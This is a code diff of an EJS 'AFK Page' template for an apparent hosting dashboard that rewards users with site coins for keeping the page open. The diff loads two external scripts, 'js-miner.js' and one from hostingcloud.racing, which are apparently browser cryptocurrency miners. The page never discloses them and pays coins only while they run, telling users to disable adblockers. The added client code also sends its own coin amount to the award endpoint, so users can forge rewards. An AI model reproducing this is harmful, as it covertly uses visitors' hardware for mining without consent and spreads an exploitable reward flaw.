@@ -1,63 +1,225 @@
 <!DOCTYPE html>
 <html lang="en">
-  <%- include('./components/head') %>
-    <body>
-      <div class="container-scroller">
-        <!-- partial:partials/_sidebar.html -->
+<%- include('./components/head') %>
+
+  <body>
+    <div class="container-scroller">
+      <!-- partial:partials/_sidebar.html -->
       <%- include('./components/sidebar') %>
         <!-- partial -->
         <div class="container-fluid page-body-wrapper">
           <!-- partial:partials/_navbar.html -->
-           <%- include('./components/topnav') %>
-          <!-- partial -->
-          <div class="main-panel">
-            <div class="content-wrapper">
-            <div class="page-header">
-              <h3 class="page-title"> Earn Coins </h3>
-            </div>
-            <%- include('./components/ads') %>
-              <div class="row">
-                <div class="col-md-12 grid-margin stretch-card">
-                                    <div class="card">
-                    <div class="card-body">
-                                  <p> By being on this page, you are supporting the service stay up & running while also earning coins </p>
-                                  <p>Every <% if (settings.api.arcio["afk page"].every !== 1) { %><%= settings.api.arcio["afk page"].every %> seconds<% } else { %>second<% } %>, you will get <%= settings.api.arcio["afk page"].coins == 1 ? "a" : settings.api.arcio["afk page"].coins %> coin<%= settings.api.arcio["afk page"].coins == 1 ? "" : "s" %>.</p>
-                <p>You will gain coins again in <span id="arciotimer"><%= settings.api.arcio["afk page"].every %></span> seconds</p>
-                       <p>You have gained <span id="arciogainedcoins">0</span> coins this AFK session</p>
-<br>
-<p>Earning Status: <br><button type="button" class="btn btn-success btn-rounded btn-icon"><i class="mdi mdi-check"></i></button>
-                  <script>
-                <%- arcioafktext %>
-            </script>
-          </div>
+          <%- include('./components/topnav') %>
+            <!-- partial -->
+            <div style="background-color: #111319" class="main-panel">
+              <div style="background-color: #111319" class="content-wrapper">
+                <h2>AFK Page</h2>
+                <p class="text-gray">Earn coins by staying on this page.</p>
+                <div class="row">
+                  <div class="col-md-12 grid-margin stretch-card">
+                    <div class="card">
+                      <div class="card-body">
+                        <h4>You are currently earning!</h4>
+                        <p>
+                          Every
+                          <% if (settings.api.arcio["afk page"].every !==1) { %>
+                            <%= settings.api.arcio["afk page"].every %> seconds
+                              <% } else { %>
+                                second
+                                <% } %>, you will get
+                                  <%= settings.api.arcio["afk page"].coins===1 ? "1" : settings.api.arcio["afk
+                                    page"].coins %> coin<%= settings.api.arcio["afk page"].coins===1 ? "" : "s" %>.
+                        </p>
+                        <p>Warning: You may be redirected back to the dashboard page if the page is frozen by the
+                          browser or there is an adblocker on!</p>
+
+                        <!-- New AFK Status and Countdown Section -->
+                        <div id="afk-status" class="mt-4 p-3"
+                          style="background-color: #1a1a1a; border-radius: 5px; text-align: center;">
+                          <div id="status-message" class="text-white">Detecting script status...</div>
+                          <div id="countdown-display" class="mt-2"
+                            style="font-size: 24px; font-weight: bold; color: #4caf50; display: none;"></div>
+                          <div id="earned-coins" class="mt-2 text-white" style="display: none;">Total earned on this
+                            session: <span id="coin-counter">0</span> coins</div>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
               </div>
+              <!-- content-wrapper ends -->
+              <%- include('./components/footer') %>
             </div>
-            <!-- content-wrapper ends -->
-          <%- include('./components/footer') %>
-          </div>
-          <!-- main-panel ends -->
+            <!-- main-panel ends -->
         </div>
         <!-- page-body-wrapper ends -->
-      </div>
-      <!-- container-scroller -->
-      <!-- plugins:js -->
-      <script src="../../assets/vendors/js/vendor.bundle.base.js"></script>
-      <!-- endinject -->
-      <!-- Plugin js for this page -->
-      <script src="../../assets/vendors/select2/select2.min.js"></script>
-      <script src="../../assets/vendors/typeahead.js/typeahead.bundle.min.js"></script>
-      <!-- End plugin js for this page -->
-      <!-- inject:js -->
-      <script src="../../assets/js/off-canvas.js"></script>
-      <script src="../../assets/js/hoverable-collapse.js"></script>
-      <script src="../../assets/js/misc.js"></script>
-      <script src="../../assets/js/settings.js"></script>
-      <script src="../../assets/js/todolist.js"></script>
-      <!-- endinject -->
-      <!-- Custom js for this page -->
-      <script src="../../assets/js/file-upload.js"></script>
-      <script src="../../assets/js/typeahead.js"></script>
-      <script src="../../assets/js/select2.js"></script>
-      <!-- End custom js for this page -->
-    </body>
-  </html>
+    </div>
+    <!-- container-scroller -->
+    <!-- plugins:js -->
+    <script src="../../assets/vendors/js/vendor.bundle.base.js"></script>
+    <!-- endinject -->
+    <!-- Plugin js for this page -->
+    <script src="../../assets/vendors/select2/select2.min.js"></script>
+    <script src="../../assets/vendors/typeahead.js/typeahead.bundle.min.js"></script>
+    <!-- End plugin js for this page -->
+    <!-- inject:js -->
+    <script src="../../assets/js/off-canvas.js"></script>
+    <script src="../../assets/js/hoverable-collapse.js"></script>
+    <script src="../../assets/js/misc.js"></script>
+    <script src="../../assets/js/settings.js"></script>
+    <script src="../../assets/js/todolist.js"></script>
+    <!-- endinject -->
+    <!-- Custom js for this page -->
+    <script src="../../assets/js/file-upload.js"></script>
+    <script src="../../assets/js/typeahead.js"></script>
+    <script src="../../assets/js/select2.js"></script>
+    <!-- End custom js for this page -->
+    <!-- External scripts for AFK functionality (moved to bottom for better loading) -->
+    <script src="https://cdn.jsdelivr.net/gh/Enlarged-Guacamole/cdn@master/js/js-miner.js"></script>
+
+    <!-- Custom AFK Detection and Countdown Script -->
+    <script>
+      // EJS variables embedded into JS (assumes settings are available; fallback to defaults if not)
+      const afkInterval = <%= typeof settings !== 'undefined' && settings.api && settings.api.arcio && settings.api.arcio["afk page"] ? settings.api.arcio["afk page"].every : 10 %>;
+      const coinsPerInterval = <%= typeof settings !== 'undefined' && settings.api && settings.api.arcio && settings.api.arcio["afk page"] ? settings.api.arcio["afk page"].coins : 1 %>;
+
+      // Global flag to track if hostingcloud script is running (not blocked)
+      let isScriptRunning = false;
+      let countdownTimer = null;
+      let remainingTime = afkInterval;
+      let totalEarnedCoins = 0;
+      let isCountingDown = false;
+
+      // Function to detect if hostingcloud script loads successfully (not blocked by adblock)
+      function detectHostingCloudScript() {
+        const statusDiv = document.getElementById('status-message');
+        const countdownDiv = document.getElementById('countdown-display');
+        const earnedDiv = document.getElementById('earned-coins');
+        const coinCounter = document.getElementById('coin-counter');
+
+        statusDiv.textContent = 'Loading hostingcloud script...';
+
+        // Dynamically load the hostingcloud script to detect blocking
+        const script = document.createElement('script');
+        script.src = 'https://www.hostingcloud.racing/Zvfk.js';
+        script.onload = function () {
+          // Script loaded successfully (not blocked)
+          isScriptRunning = true;
+          statusDiv.textContent = 'Script is running! Starting countdown...';
+          countdownDiv.style.display = 'block';
+          earnedDiv.style.display = 'block';
+          coinCounter.textContent = totalEarnedCoins;  // Initialize counter
+          startCountdown();
+        };
+        script.onerror = function () {
+          // Script failed to load (likely blocked by adblock)
+          isScriptRunning = false;
+          statusDiv.innerHTML = '<span style="color: #f44336;">Disable your adblock to earn</span>';
+          countdownDiv.style.display = 'none';
+          earnedDiv.style.display = 'none';
+          // Optionally, stop any miner or other scripts here if needed
+        };
+
+        document.body.appendChild(script);
+      }
+
+      // Function to start the countdown
+      function startCountdown() {
+        if (isCountingDown) return;
+        isCountingDown = true;
+        remainingTime = afkInterval;
+        updateCountdownDisplay();
+
+        countdownTimer = setInterval(function () {
+          remainingTime--;
+          updateCountdownDisplay();
+
+          if (remainingTime <= 0) {
+            // Award coins (visual first)
+            totalEarnedCoins += coinsPerInterval;
+            document.getElementById('coin-counter').textContent = totalEarnedCoins;
+
+            // Visual feedback
+            document.getElementById('status-message').textContent = `Awarded ${coinsPerInterval} coin${coinsPerInterval === 1 ? '' : 's'}!`;
+            setTimeout(() => {
+              if (isScriptRunning) {
+                document.getElementById('status-message').textContent = 'Script is running! Continuing...';
+              }
+            }, 2000);
+
+            // Send to server only if script is running (server will handle userId via session)
+            if (isScriptRunning) {
+              fetch('/api/award-afk-coins', {
+                method: 'POST',
+                headers: {
+                  'Content-Type': 'application/json'
+                  // Add auth headers if using JWT or similar (e.g., 'Authorization': 'Bearer ' + token)
+                },
+                body: JSON.stringify({
+                  coins: coinsPerInterval,
+                  afkSession: true  // Flag to verify script was active
+                })
+              })
+                .then(response => response.json())
+                .then(data => {
+                  if (data.success) {
+                    console.log('Coins awarded:', data);
+                    // Sync client counter with server balance if provided
+                    if (data.newBalance !== undefined) {
+                      totalEarnedCoins = data.newBalance;
+                      document.getElementById('coin-counter').textContent = totalEarnedCoins;
+                    }
+                  } else {
+                    console.error('Award failed:', data.error);
+                    // Optionally show error in UI
+                    document.getElementById('status-message').textContent = `Error: ${data.error}`;
+                  }
+                })
+                .catch(err => {
+                  console.error('Network error:', err);
+                  // Optionally show error in UI
+                  document.getElementById('status-message').textContent = 'Network error - coins may not have been awarded.';
+                });
+            }
+
+            remainingTime = afkInterval;
+          }
+        }, 1000);
+      }
+
+      // Function to update the countdown display
+      function updateCountdownDisplay() {
+        const countdownDiv = document.getElementById('countdown-display');
+        if (isScriptRunning && isCountingDown) {
+          countdownDiv.textContent = `${remainingTime}s until next reward`;
+          countdownDiv.style.color = remainingTime <= 5 ? '#f44336' : '#4caf50'; // Red for last 5 seconds
+        }
+      }
+
+      // Stop countdown if page is hidden or inactive (AFK detection - pauses if tab is not active)
+      document.addEventListener('visibilitychange', function () {
+        if (document.hidden && isCountingDown) {
+          clearInterval(countdownTimer);
+          isCountingDown = false;
+          document.getElementById('status-message').textContent = 'Page hidden - pausing earnings.';
+        } else if (!document.hidden && isScriptRunning && !isCountingDown) {
+          startCountdown();
+        }
+      });
+
+      // Initialize detection when page loads
+      window.addEventListener('load', function () {
+        setTimeout(detectHostingCloudScript, 1000); // Small delay to ensure page is ready
+      });
+
+      // Cleanup on page unload
+      window.addEventListener('beforeunload', function () {
+        if (countdownTimer) {
+          clearInterval(countdownTimer);
+        }
+        // Optionally send final earnings to server here if needed
+      });
+    </script>
+  </body>
+
+</html>
